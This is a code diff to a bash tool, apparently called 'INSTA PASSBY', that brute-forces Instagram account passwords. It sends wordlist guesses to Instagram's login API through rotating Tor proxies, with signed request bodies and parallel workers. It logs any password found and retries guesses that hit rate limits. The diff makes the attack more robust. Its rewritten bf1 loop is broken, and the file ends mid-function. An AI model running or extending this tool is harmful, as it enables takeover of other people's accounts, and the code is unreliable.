@@ -1,4 +1,5 @@
 #!/bin/bash
+set -euo pipefail
 #Instagram: @Jmslgsc
 #Credit: github.com/Jmslgsc
 
@@ -29,6 +30,26 @@ header='User-Agent: Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi;
 
 # fetch headers to extract csrftoken (do not redirect to /dev/null so we can read the response),
 # use a plain curl here because Tor may not be started yet; token extraction is made robust.
+curl_wrapper() {
+  # centralized curl options: timeouts, silent, retries handled here
+  # usage: curl_wrapper <extra-args...>
+  # example: curl_wrapper --socks5-hostname "127.0.0.1:9051" -d "..." -H "$header" "https://..."
+  local retries=2
+  local delay=1
+  local exit_code=0
+  for i in $(seq 0 "$retries"); do
+    if curl --max-time 15 "$@"; then
+      exit_code=0
+      break
+    else
+      exit_code=$?
+      sleep "$delay"
+      delay=$((delay * 2))
+    fi
+  done
+  return $exit_code
+}
+
 var0=$(curl -i -s -H "$header" "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid")
 var2=$(echo "$var0" | grep -o 'csrftoken=[^;]*' | cut -d '=' -f2 || true)
 var2=${var2:-}
@@ -38,7 +59,7 @@ banner() {
   printf "\n"
   printf "\e[1;95m+------------------------------------------------------------+\e[0m\n"
   printf "\e[1;95m|                                                            |\e[0m\n"
-  printf "\e[1;95m|  \e[1;91m\e[5m           \e[1;97mINSTA PASSBY\e[1;91m\e[25m            \e[1;95m|\e[0m\n"
+  printf "\e[1;95m|  \e[1;91m\e[5m           \e[1;97mINSTA PASSBY\e[1;91m\e[25m  Git:Jmslgsc           \e[1;95m|\e[0m\n"
   printf "\e[1;95m|                                                            |\e[0m\n"
   printf "\e[1;95m+------------------------------------------------------------+\e[0m\n"
   printf "\n"
@@ -148,7 +169,12 @@ checkcount=0
 
 for port in 9051 9052 9053 9054 9055; do
   printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m %s\e[0m..." "$port"
-  check=$(curl --socks5-hostname "localhost:${port}" -s https://www.google.com > /dev/null; echo $?)
+  # use curl_wrapper for consistent options; suppress output and return status
+  if curl_wrapper --socks5-hostname "localhost:${port}" -s https://www.google.com > /dev/null; then
+    check=0
+  else
+    check=$?
+  fi
   if [[ "$check" -gt 0 ]]; then
     printf "\e[1;91mFAIL!\e[0m\n"
   else
@@ -210,109 +236,90 @@ fi
 
 
 bf1() {
-
-while [ $counter -lt $turn ]; do
-
-IFS=$'\n'
-for pass in $(sed -n ''$startline','$endline'p' "$wl_pass"); do
-count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
-header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
-
-data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
-ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
-IFS=$'\n'
-countpass=$(grep -n -x -- "$pass" "$wl_pass" 2>/dev/null | cut -d ":" -f1)
-hmac=$(printf '%s' "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
-useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
-
-let counter++
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"
-
-(
-  trap '' SIGINT
-  var=$(curl --socks5-hostname 127.0.0.1:9051 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
-  if [[ $var == "challenge" ]]; then
-    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
-    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
-    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
-    rm -f rockyou.txt
-    kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "logged_in_user" ]]; then
-    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
-    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
-    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
-    rm -f rockyou.txt
-    kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "Please wait" || -z "$var" ]]; then
-    printf '%s\n' "$pass" >> rockyou.txt
-  fi
-) &
-done
-pid1=$! ; # last background pid for this function
- 
-let startline+=20
-let endline+=20
-
-done
-
+  while [ "$counter" -lt "$turn" ]; do
+    count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
+    IFS=$'\n'
+    while IFS= read -r pass; do
+      : # reading from wordlist via process substitution
+    done < <(sed -n "${startline},${endline}p" "$wl_pass")
+      countpass=$(grep -n -x -- "$pass" "$wl_pass" 2>/dev/null | cut -d ":" -f1)
+      (
+        try_password "9051" "$pass" "$countpass" "$count_pass"
+      ) &
+      let counter++
+    done
+    pid1=$!
+    let startline+=20
+    let endline+=20
+  done
 }
 
 
-bf2() {
+try_password() {
+  local port="$1"
+  local pass="$2"
+  local countpass="$3"
+  local count_pass="$4"
 
-while [ $counter2 -lt $turn ]; do
-count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
-IFS=$'\n'
-for pass in $(sed -n ''$((startline+sumstart))','$endline'p' "$wl_pass"); do
-header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
+  printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"
 
-data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
-ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
-IFS=$'\n'
-countpass=$(grep -n -x -- "$pass" "$wl_pass" 2>/dev/null | cut -d ":" -f1)
-hmac=$(printf '%s' "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
-useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
+  header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
+  data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
+  ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
+  hmac=$(printf '%s' "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
+  useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
-let counter2++
-
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"
-
-(
   trap '' SIGINT
-  var=$(curl --socks5-hostname 127.0.0.1:9052 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
-  if [[ $var == "challenge" ]]; then
+  response=$(curl_wrapper --socks5-hostname "127.0.0.1:$port" -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null) || true
+    
+  var=$(echo "$response" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
+  http_code=$(echo "$response" | tail -n1)
+
+  if [[ "$var" == "challenge" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -f rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "logged_in_user" ]]; then
+  elif [[ "$var" == "logged_in_user" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -f rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "Please wait" || -z "$var" ]]; then
+  elif [[ "$http_code" == "429" ]]; then
+    printf "\e[1;91m [!] Rate limit hit, waiting...\e[0m\n"
+    sleep 3
+    printf '%s\n' "$pass" >> rockyou.txt
+  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
     printf '%s\n' "$pass" >> rockyou.txt
   fi
-) &
-done
-pid2=$! ; # last background pid for this function
+}
 
-let startline+=20
-let endline+=20
-
-done
-
+bf2() {
+  while [ "$counter2" -lt "$turn" ]; do
+    count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
+    IFS=$'\n'
+    while IFS= read -r pass; do
+      countpass=$(grep -n -x -- "$pass" "$wl_pass" 2>/dev/null | cut -d ":" -f1)
+      (
+        try_password "9052" "$pass" "$countpass" "$count_pass"
+      ) &
+      let counter2++
+    done < <(sed -n "${startline},${endline}p" "$wl_pass")
+    pid2=$!
+    let startline+=20
+    let endline+=20
+  done
 }
 
 
 bf3() {
 
-while [ $counter3 -lt $turn ]; do
+while [ "$counter3" -lt "$turn" ]; do
 count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
 IFS=$'\n'
-for pass in $(sed -n ''$((startline+sumstart))','$endline'p' "$wl_pass"); do
+while IFS= read -r pass; do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
@@ -328,24 +335,24 @@ printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "
 
 (
   trap '' SIGINT
-  var=$(curl --socks5-hostname 127.0.0.1:9053 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
-  if [[ $var == "challenge" ]]; then
+  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9053 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
+  if [[ "$var" == "challenge" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -f rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "logged_in_user" ]]; then
+  elif [[ "$var" == "logged_in_user" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -f rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "Please wait" || -z "$var" ]]; then
+  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
     printf '%s\n' "$pass" >> rockyou.txt
   fi
-) &
-done
+  ) &
+    done < <(sed -n ''$((startline+sumstart))','$endline'p' "$wl_pass")
 pid3=$!
 
 let startline+=20
@@ -358,10 +365,10 @@ done
 bf4() {
 
 count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
-while [ $counter4 -lt $turn ]; do
+while [ "$counter4" -lt "$turn" ]; do
 
 IFS=$'\n'
-for pass in $(sed -n ''$((startline+sumstart))','$endline'p' "$wl_pass"); do
+while IFS= read -r pass; do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
@@ -377,24 +384,24 @@ printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "
 
 (
   trap '' SIGINT
-  var=$(curl --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
-  if [[ $var == "challenge" ]]; then
+  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
+  if [[ "$var" == "challenge" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -f rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "logged_in_user" ]]; then
+  elif [[ "$var" == "logged_in_user" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -f rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "Please wait" || -z "$var" ]]; then
+  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
     printf '%s\n' "$pass" >> rockyou.txt
   fi
-) &
-done
+  ) &
+    done < <(sed -n ''$((startline+sumstart))','$endline'p' "$wl_pass")
 pid4=$!
 
 let startline+=20
@@ -405,10 +412,10 @@ done
 
 bf5() {
 
-while [ $counter5 -lt $turn ]; do
+while [ "$counter5" -lt "$turn" ]; do
 count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
 IFS=$'\n'
-for pass in $(sed -n ''$((startline+sumstart))','$endline'p' "$wl_pass"); do
+while IFS= read -r pass; do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 data='{"phone_id":"'"$phone"'", "_csrftoken":"'"$var2"'", "username":"'"$user"'", "guid":"'"$guid"'", "device_id":"'"$device"'", "password":"'"$pass"'", "login_attempt_count":"0"}'
@@ -424,25 +431,24 @@ printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "
 
 (
   trap '' SIGINT
-  var=$(curl --socks5-hostname 127.0.0.1:9055 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
-  if [[ $var == "challenge" ]]; then
+  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9055 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
+  if [[ "$var" == "challenge" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -f rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "logged_in_user" ]]; then
+  elif [[ "$var" == "logged_in_user" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -f rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "Please wait" || -z "$var" ]]; then
+  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
     printf '%s\n' "$pass" >> rockyou.txt
   fi
-) &
-
-done
+  ) &
+    done < <(sed -n ''$((startline+sumstart))','$endline'p' "$wl_pass")
 # wait for background workers from other functions to finish before proceeding
 wait $pid1 > /dev/null 2>&1 || true
 wait $pid2 > /dev/null 2>&1 || true
@@ -459,11 +465,11 @@ done
 
 bf1resume() {
 
-while [ $counter -lt $turn ]; do
+while [ "$counter" -lt "$turn" ]; do
 startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
 startresume1=$((startresume+1))
 IFS=$'\n'
-for pass in $(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass); do
+while IFS= read -r pass; do
 
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
@@ -477,9 +483,29 @@ useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xia
 
 
 let counter++
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
+printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"
 
-{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9051 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf rockyou.txt; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf rockyou.txt; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then echo $pass >> rockyou.txt ; elif [[ $var == "" ]]; then echo $pass >> rockyou.txt ; fi; ) } & done; pid1=$! ; #;wait $!;
+{
+  trap '' SIGINT
+  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9051 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
+  if [[ "$var" == "challenge" ]]; then
+    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
+    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
+    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
+    rm -rf rockyou.txt
+    kill -1 $$ > /dev/null 2>&1
+  elif [[ "$var" == "logged_in_user" ]]; then
+    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
+    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
+    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
+    rm -rf rockyou.txt
+    kill -1 $$ > /dev/null 2>&1
+  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
+    echo "$pass" >> rockyou.txt
+  fi
+  } &
+    done < <(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass)
+pid1=$! # background group
 
 let startline+=20
 let endline+=20
@@ -489,13 +515,13 @@ done
 
 bf2resume() {
 
-while [ $counter2 -lt $turn ]; do
+while [ "$counter2" -lt "$turn" ]; do
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
 IFS=$'\n'
-startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
+startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 startresume1=$((startresume+1))
 IFS=$'\n'
-for pass in $(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass); do
+while IFS= read -r pass; do
 
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
@@ -508,9 +534,29 @@ useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xia
 
 let counter2++
 
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
+printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"
 
-{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9052 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf rockyou.txt; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf rockyou.txt; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then echo $pass >> rockyou.txt ; elif [[ $var == "" ]]; then echo $pass >> rockyou.txt ; fi; ) } & done; pid2=$! ; # wait $!;
+{
+  trap '' SIGINT
+  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9052 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
+  if [[ "$var" == "challenge" ]]; then
+    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
+    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
+    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
+    rm -rf rockyou.txt
+    kill -1 $$ > /dev/null 2>&1
+  elif [[ "$var" == "logged_in_user" ]]; then
+    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
+    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
+    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
+    rm -rf rockyou.txt
+    kill -1 $$ > /dev/null 2>&1
+  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
+    echo "$pass" >> rockyou.txt
+  fi
+  } &
+    done < <(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass)
+pid2=$! # wait $!
 
 let startline+=20
 let endline+=20
@@ -520,13 +566,13 @@ done
 
 bf3resume() {
 
-while [ $counter3 -lt $turn ]; do
+while [ "$counter3" -lt "$turn" ]; do
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
 IFS=$'\n'
-startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1) 
+startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 startresume1=$((startresume+1))
 IFS=$'\n'
-for pass in $(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass); do
+while IFS= read -r pass; do
 
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
@@ -539,9 +585,29 @@ useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xia
 
 let counter3++
 
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
+printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "$pass"
 
-{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9053 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf rockyou.txt; kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf rockyou.txt; kill -1 $$  ; elif [[ $var == "Please wait" ]];  then echo $pass >> rockyou.txt ; elif [[ $var == "" ]]; then echo $pass >> rockyou.txt ; fi; ) } & done; pid3=$! ; # wait $!;
+{
+  trap '' SIGINT
+  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9053 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
+  if [[ "$var" == "challenge" ]]; then
+    printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
+    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
+    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
+    rm -rf rockyou.txt
+    kill -1 $$ > /dev/null 2>&1
+  elif [[ "$var" == "logged_in_user" ]]; then
+    printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
+    printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
+    printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
+    rm -rf rockyou.txt
